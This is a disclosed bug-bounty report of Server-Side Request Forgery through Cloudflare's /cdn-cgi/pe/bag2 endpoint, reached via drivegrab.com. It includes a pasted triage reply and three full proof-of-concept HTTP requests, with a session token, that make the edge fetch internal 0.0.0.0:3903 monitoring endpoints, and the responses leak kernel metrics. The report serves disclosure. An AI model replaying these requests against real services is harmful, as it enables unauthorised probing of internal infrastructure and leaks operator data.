@@ -1,0 +1,258 @@
+ReportLink:https://hackerone.com/reports/253558
+WeaknessName:Server-Side Request Forgery (SSRF)
+Reporter:https://hackerone.com/linkks
+ReportedTo:Cloudflare(cloudflare)
+BountyAmount:
+Severity:critical
+State:Closed
+DateOfDisclosure:25.02.2018 21:22:41
+
+Summary:
+
+Hi i  make report grabtaxi for SSRF 
+
+But grabtaxi answer me 
+
+coffeecup closed the report and changed the status to Not Applicable.	Jul 26th (2 hrs ago)
+Hello @linkks - After further review, we have determined that this is not SSRF on any of our web properties or assets. All IP's mentioned in this report belong to Cloudflare. Additionally, please refrain from contacting us via email, please keep all communication here so that we have a record of each interaction which will aid us in our review of the report.
+
+Please do not close as n/a 
+
+And I want to understand if there is a threat of grabtaxi and a full investigation from you
+
+
+
+GET /cdn-cgi/pe/bag2?r[]=http://0.0.0.0:3903/metrics HTTP/1.1
+Host: www.drivegrab.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+PE-Token: dd05cd37a5edf79869bd11b027139a5afe194c5e-1500646565-1800
+Referer: https://www.drivegrab.com/
+Cookie: __cfduid=de220b258d3e4ddba3e27a9b4f8ff7ccd1500243180
+Connection: close
+
+HTTP/1.1 200 OK
+Date: Fri, 21 Jul 2017 15:58:31 GMT
+Content-Type: multipart/mixed; boundary="g3g8yN?IPMW,-eDpa?"
+Connection: close
+Server: cloudflare-nginx
+CF-RAY: 381f5cb7183d234e-FRA
+Content-Length: 934
+
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="g3g8yN?IPMW,-eDpa?"
+
+--g3g8yN?IPMW,-eDpa?
+X-Cf-Url: http://0.0.0.0:3903/metrics
+X-Cf-Status: 200
+Content-Transfer-Encoding: binary
+X-Cf-Max-Age: 7200
+X-Cf-Origin-Status: 200
+X-Cf-Cache-Status: MISS
+Content-Type: text/plain; version=0.0.4
+X-Cf-Error: false
+
+TYPE kernel_mce_events counter
+
+TYPE kernel_cpu_throttled counter
+
+TYPE kernel_edac_events counter
+
+TYPE kernel_oom_kill counter
+
+TYPE kernel_segfault counter
+
+kernel_segfault{binary="syslog-ng",prog="kernel.mtail",instance="71m87"} 5
+
+TYPE kernel_hung_tasks_total counter
+
+TYPE kernel_warnings_total counter
+
+kernel_warnings_total{prog="kernel.mtail",instance="71m87"} 112
+
+TYPE kernel_drive_errors counter
+
+TYPE kernel_rcu_stalls counter
+
+TYPE kernel_slub_allocation_failures counter
+
+TYPE kernel_memory_cgroup_limit_exceeded counter
+
+TYPE kernel_tpm_errors counter
+
+--g3g8yN?IPMW,-eDpa?--
+
+GET /cdn-cgi/pe/bag2?r[]=http://0.0.0.0:3903/varz HTTP/1.1
+Host: www.drivegrab.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+PE-Token: dd05cd37a5edf79869bd11b027139a5afe194c5e-1500646565-1800
+Referer: https://www.drivegrab.com/
+Cookie: __cfduid=de220b258d3e4ddba3e27a9b4f8ff7ccd1500243180
+Connection: close
+
+HTTP/1.1 200 OK
+Date: Fri, 21 Jul 2017 16:00:18 GMT
+Content-Type: multipart/mixed; boundary="pyqE0ca4mBrM:YWUNOU"
+Connection: close
+Server: cloudflare-nginx
+CF-RAY: 381f5f52d9e163a3-FRA
+Content-Length: 642
+
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="pyqE0ca4mBrM:YWUNOU"
+
+--pyqE0ca4mBrM:YWUNOU
+X-Cf-Url: http://0.0.0.0:3903/varz
+X-Cf-Status: 200
+Content-Transfer-Encoding: binary
+X-Cf-Max-Age: 7200
+X-Cf-Origin-Status: 200
+X-Cf-Cache-Status: MISS
+Content-Type: text/plain
+X-Cf-Error: false
+
+kernel_oom_kill{binary=prometheus-node,prog=kernel.mtail,instance=71m141} 1
+kernel_segfault{binary=syslog-ng,prog=kernel.mtail,instance=71m141} 5
+kernel_warnings_total{prog=kernel.mtail,instance=71m141} 31
+kernel_memory_cgroup_limit_exceeded{binary=prometheus-node,prog=kernel.mtail,instance=71m141} 1
+
+--pyqE0ca4mBrM:YWUNOU--
+
+GET /cdn-cgi/pe/bag2?r[]=http://0.0.0.0:3903/json HTTP/1.1
+Host: www.drivegrab.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+PE-Token: dd05cd37a5edf79869bd11b027139a5afe194c5e-1500646565-1800
+Referer: https://www.drivegrab.com/
+Cookie: __cfduid=de220b258d3e4ddba3e27a9b4f8ff7ccd1500243180
+Connection: close
+
+HTTP/1.1 200 OK
+Date: Fri, 21 Jul 2017 16:02:44 GMT
+Content-Type: multipart/mixed; boundary="T,F+Duk6WA)ov6"
+Connection: close
+Server: cloudflare-nginx
+CF-RAY: 381f62e4f9b263a3-FRA
+Content-Length: 1959
+
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="T,F+Duk6WA)ov6"
+
+--T,F+Duk6WA)ov6
+X-Cf-Url: http://0.0.0.0:3903/json
+X-Cf-Status: 200
+Content-Transfer-Encoding: binary
+X-Cf-Max-Age: 7200
+X-Cf-Origin-Status: 200
+X-Cf-Cache-Status: MISS
+Content-Type: application/json
+X-Cf-Error: false
+
+[
+{
+"Name": "kernel_mce_events",
+"Program": "kernel.mtail",
+"Kind": 1
+},
+{
+"Name": "kernel_cpu_throttled",
+"Program": "kernel.mtail",
+"Kind": 1
+},
+{
+"Name": "kernel_edac_events",
+"Program": "kernel.mtail",
+"Kind": 1
+},
+{
+"Name": "kernel_oom_kill",
+"Program": "kernel.mtail",
+"Kind": 1,
+"Keys": [
+"binary"
+]
+},
+{
+"Name": "kernel_segfault",
+"Program": "kernel.mtail",
+"Kind": 1,
+"Keys": [
+"binary"
+],
+"LabelValues": [
+{
+"Labels": [
+"syslog-ng"
+],
+"Value": {
+"Value": 2,
+"Time": 1500236514000000000
+}
+}
+]
+},
+{
+"Name": "kernel_hung_tasks_total",
+"Program": "kernel.mtail",
+"Kind": 1,
+"Keys": [
+"binary"
+]
+},
+{
+"Name": "kernel_warnings_total",
+"Program": "kernel.mtail",
+"Kind": 1,
+"LabelValues": [
+{
+"Value": {
+"Value": 68,
+"Time": 1500355476000000000
+}
+}
+]
+},
+{
+"Name": "kernel_drive_errors",
+"Program": "kernel.mtail",
+"Kind": 1,
+"Keys": [
+"drive"
+]
+},
+{
+"Name": "kernel_rcu_stalls",
+"Program": "kernel.mtail",
+"Kind": 1
+},
+{
+"Name": "kernel_slub_allocation_failures",
+"Program": "kernel.mtail",
+"Kind": 1
+},
+{
+"Name": "kernel_memory_cgroup_limit_exceeded",
+"Program": "kernel.mtail",
+"Kind": 1,
+"Keys": [
+"binary"
+]
+},
+{
+"Name": "kernel_tpm_errors",
+"Program": "kernel.mtail",
+"Kind": 1,
+"Keys": [
+"errorcode"
+]
+}
+]
+--T,F+Duk6WA)ov6--
+
